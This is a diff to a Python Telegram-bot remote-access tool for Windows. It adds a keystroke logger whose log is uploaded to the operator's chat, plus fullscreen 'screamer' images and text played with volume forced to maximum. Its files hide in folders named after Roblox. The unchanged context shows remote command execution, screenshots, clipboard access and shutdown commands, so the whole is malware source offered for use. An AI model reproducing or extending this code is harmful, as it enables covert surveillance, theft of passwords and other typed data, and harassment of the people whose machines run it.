@@ -6,9 +6,10 @@ import subprocess
 import socket
 import psutil
 from telebot import types
-from PIL import ImageGrab
+from PIL import ImageGrab, Image, ImageTk  
 import random
 import shutil
+import tkinter as tk
 import webbrowser
 import ctypes
 import sys
@@ -18,6 +19,7 @@ import keyboard as kb
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
+from pynput import keyboard
 import pyperclip
 
 username = getpass.getuser()
@@ -47,7 +49,18 @@ keys = [
 bot_token = 'your bot token from -> @BotFather'
 bot = telebot.TeleBot(bot_token)
 
-cmd_spam_processes = []
+def set_volume():
+    try:
+        CoInitialize()
+
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = interface.QueryInterface(IAudioEndpointVolume)
+
+        volume.SetMasterVolumeLevelScalar(1.0, None)
+
+    finally:
+        CoUninitialize()
 
 def restart_on_exit():
     parent_pid = os.getpid() 
@@ -100,13 +113,249 @@ def create_keyboard():
         types.KeyboardButton("/sound"),
         types.KeyboardButton("/cmd command"),
         types.KeyboardButton("/screen"),
-        types.KeyboardButton("/photo"),
+        types.KeyboardButton("/wallpaper"),
         types.KeyboardButton("/buffer"),
         types.KeyboardButton("/info"),
         types.KeyboardButton("/shutdown"),
+        types.KeyboardButton("/start_listening"),
+        types.KeyboardButton("/stop_listening"),
+        types.KeyboardButton("/send_keylog"),
+        types.KeyboardButton("/screamer"),
+        types.KeyboardButton("/stop_screamer"),
+        types.KeyboardButton("/open_text"),
+        types.KeyboardButton("/close_text"),
     )
     return keyboard
     
+image_path = rf"C:\Users\{username}\AppData\Local\Roblox\Images\temp_image.jpg"
+save_dir = rf"C:\Users\{username}\AppData\Local\Roblox\Images"
+os.makedirs(save_dir, exist_ok=True)
+screen_thread = None
+root = None
+root1 = None
+text_thread = None
+
+def display_text_fullscreen(text):
+    global root1
+    if root1:
+        return 
+
+    root1 = tk.Tk()
+    root1.attributes('-fullscreen', True)
+    root1.attributes('-topmost', True)
+
+    label = tk.Label(
+        root1,
+        text=text,
+        font=("Arial", 40),
+        fg="white",
+        bg="black",
+        wraplength=root1.winfo_screenwidth(),
+        justify="center"
+    )
+    label.pack(expand=True, fill=tk.BOTH)
+
+    root1.mainloop()
+    root1 = None
+
+def display_image_fullscreen(image_path):
+    global root
+    if root:
+        return 
+
+    root = tk.Tk()
+    root.attributes('-fullscreen', True)
+    root.attributes('-topmost', True) 
+
+    img = Image.open(image_path)
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+
+    img = img.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
+    img = ImageTk.PhotoImage(img)
+
+    label = tk.Label(root, image=img)
+    label.img = img
+    label.pack()
+
+    root.mainloop()
+    root = None
+
+def stop_screen():
+    global root
+    if root:
+        root.destroy()
+        root = None
+
+def stop_text():
+    global root1
+    if root1:
+        root1.destroy()
+        root1 = None
+
+@bot.message_handler(commands=['open_text'])
+def open_text(message):
+    global text_thread
+    try:
+        args = message.text.split(' ', 2)
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "Usage: /open_text text", reply_markup=create_keyboard())
+            return
+
+        text = message.text[len('/open_text '):].strip()
+
+        if text_thread and text_thread.is_alive():
+            bot.send_message(message.chat.id, "Another screen is already active. Please stop it first", reply_markup=create_keyboard())
+            return
+
+        text_thread = threading.Thread(target=display_text_fullscreen, args=(text,))
+        text_thread.start()
+        
+        set_volume()
+        pygame.init()
+        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\muski.mp3', reply_markup=create_keyboard())
+        song.play()
+        time.sleep(song.get_length())
+        pygame.quit()
+
+        bot.send_message(message.chat.id, "Text is now displayed on the screen.", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['close_text'])
+def close_text(message):
+    global text_thread
+    try:
+        if not text_thread:
+            bot.send_message(message.chat.id, "text is already stopped", reply_markup=create_keyboard())
+            return
+        stop_text()
+        bot.send_message(message.chat.id, "text display stopped", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
+
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    global image_path
+    try:
+        file_info = bot.get_file(message.photo[-1].file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+
+        with open(image_path, 'wb') as file:
+            file.write(downloaded_file)
+
+        final_save_path = os.path.join(save_dir, f"image_{int(time.time())}.jpg")
+        with open(final_save_path, 'wb') as file:
+            file.write(downloaded_file)
+
+        bot.send_message(message.chat.id, f"Image received and saved to {final_save_path}. Use /start_screen to display it", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['screamer'])
+def start_screen(message):
+    global screen_thread
+    try:
+        if not os.path.exists(image_path):
+            bot.send_message(message.chat.id, "No image to display. Please send an image first", reply_markup=create_keyboard())
+            return
+
+        if screen_thread and screen_thread.is_alive():
+            bot.send_message(message.chat.id, "Image is already displayed", reply_markup=create_keyboard())
+            return
+
+        screen_thread = threading.Thread(target=display_image_fullscreen, args=(image_path,))
+        screen_thread.start()
+
+        set_volume()
+        pygame.init()
+        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\muski.mp3', reply_markup=create_keyboard())
+        song.play()
+        time.sleep(song.get_length())
+        pygame.quit()
+
+        bot.send_message(message.chat.id, "Image is now displayed on the screen", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['stop_screamer'])
+def stop_screen_command(message):
+    global screen_thread
+    try:
+        if not screen_thread:
+            bot.send_message(message.chat.id, "Image is already stopped", reply_markup=create_keyboard())
+            return
+        stop_screen()
+        bot.send_message(message.chat.id, "Screen display stopped", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+KEYLOG_FILE = rf'C:\Users\{username}\AppData\Local\keylog.txt'
+
+listener = None
+listening = False
+
+def write_to_file(key):
+    with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
+        f.write(f'{key}\n')
+
+def on_press(key):
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            write_to_file(key.char)
+        else:
+            write_to_file(str(key))
+    except Exception as e:
+        write_to_file(f'Error: {e}')
+
+def start_keylogger():
+    global listener, listening
+    if not listening:
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        listening = True
+
+def stop_keylogger():
+    global listener, listening
+    if listening and listener:
+        listener.stop()
+        listening = False
+
+@bot.message_handler(commands=['start_listening'])
+def start_listening(message):
+    global listening
+    try:
+        if listening:
+            bot.send_message(message.chat.id, "listening already started")
+            return
+        start_keylogger()
+        bot.send_message(message.chat.id, "Started listening to keyboard events")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+@bot.message_handler(commands=['stop_listening'])
+def stop_listening(message):
+    global listening
+    try:
+        if not listening:
+            bot.send_message(message.chat.id, "listening already stopped")
+            return
+        stop_keylogger()
+        bot.send_message(message.chat.id, "Stopped listening to keyboard events")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+@bot.message_handler(commands=['send_keylog'])
+def send_keylog(message):
+    try:
+        if os.path.exists(KEYLOG_FILE):
+            with open(KEYLOG_FILE, 'rb') as file:
+                bot.send_document(message.chat.id, file)
+        else:
+            bot.send_message(message.chat.id, "No keylog file found")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
 @bot.message_handler(commands=['buffer'])
 def unblock_keys(message):
     args = message.text.split(' ')
@@ -347,31 +596,42 @@ def move_mousik(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
 
-def set_volume():
-    try:
-        CoInitialize()
-
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = interface.QueryInterface(IAudioEndpointVolume)
-
-        volume.SetMasterVolumeLevelScalar(1.0, None)
-
-    finally:
-        CoUninitialize()
+DOWNLOAD_DIR = rf'C:\Users\{username}\AppData\Local\Roblox\Musics'
+os.makedirs(DOWNLOAD_DIR, exist_ok=True)
 
 @bot.message_handler(commands=['sound'])
 def play_sound(message):
     try:
         set_volume()
+        file_path = rf'{DOWNLOAD_DIR}\muski.mp3'
+        if not os.path.exists(file_path):
+            bot.send_message(message.chat.id, "Default MP3 file not found.", reply_markup=create_keyboard())
+            return
+        
         pygame.init()
-        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\ass.mp3')
+        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\muski.mp3')
         song.play()
         time.sleep(song.get_length())
         pygame.quit()
         bot.send_message(message.chat.id, "Sound played successfully", reply_markup=create_keyboard())
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
+
+@bot.message_handler(content_types=['audio', 'document'])
+def handle_audio(message):
+    try:
+        if message.content_type == 'audio' or (message.content_type == 'document' and message.document.mime_type == 'audio/mpeg'):
+            file_info = bot.get_file(message.audio.file_id if message.content_type == 'audio' else message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            file_path = os.path.join(DOWNLOAD_DIR, 'muski.mp3')
+            with open(file_path, 'wb') as new_file:
+                new_file.write(downloaded_file)
+            bot.send_message(message.chat.id, "MP3 file uploaded and ready to play.", reply_markup=create_keyboard())
+        else:
+            bot.send_message(message.chat.id, "Please send a valid MP3 file.", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
+
 
 mouse_spam = True
 
@@ -497,23 +757,18 @@ def set_wallpaper(file_id):
 
     ctypes.windll.user32.SystemParametersInfoA(20, 0, save_path.encode('utf-8'), 3)
 
-@bot.message_handler(content_types=['photo'])
+@bot.message_handler(content_types=['wallpaper'])
 def handle_photo(message):
     try:
         file_id = message.photo[-1].file_id
         set_wallpaper(file_id)
         bot.reply_to(message, f"The wallpaper has been successfully saved", reply_markup=create_keyboard())
     except Exception as e:
-        bot.reply_to(message, f"There was an error when receiving the photo: {e}", reply_markup=create_keyboard())
+        bot.reply_to(message, f"There was an error when receiving the wallpaper: {e}", reply_markup=create_keyboard())
 
 @bot.message_handler(commands=['cmd'])
 def run_command(message):
     try:
-        args = message.text.split(' ', 2)
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /cmd command", reply_markup=create_keyboard())
-            return
-
         command = message.text[len('/cmd '):].strip()
         
         if not command:
@@ -590,6 +845,9 @@ def kill_explorer():
 @bot.message_handler(commands=['explorer_spam'])
 def explorer_spam(message):
     try:
+        if spam_running:
+            bot.send_message(message.chat.id, "explorer_spam is already running")
+            return
         threading.Thread(target=open_explorer, daemon=True).start()
         bot.send_message(message.chat.id, f"Explorer spam executed", reply_markup=create_keyboard())
     except Exception as e:
@@ -598,6 +856,9 @@ def explorer_spam(message):
 @bot.message_handler(commands=['stop_explorer_spam'])
 def stop_explorer_spam(message):
     try:
+        if not spam_running:
+            bot.send_message(message.chat.id, "explorer_spam is already stopped")
+            return
         kill_explorer()
         bot.send_message(message.chat.id, f"Stopped Explorer spam", reply_markup=create_keyboard())
     except Exception as e:
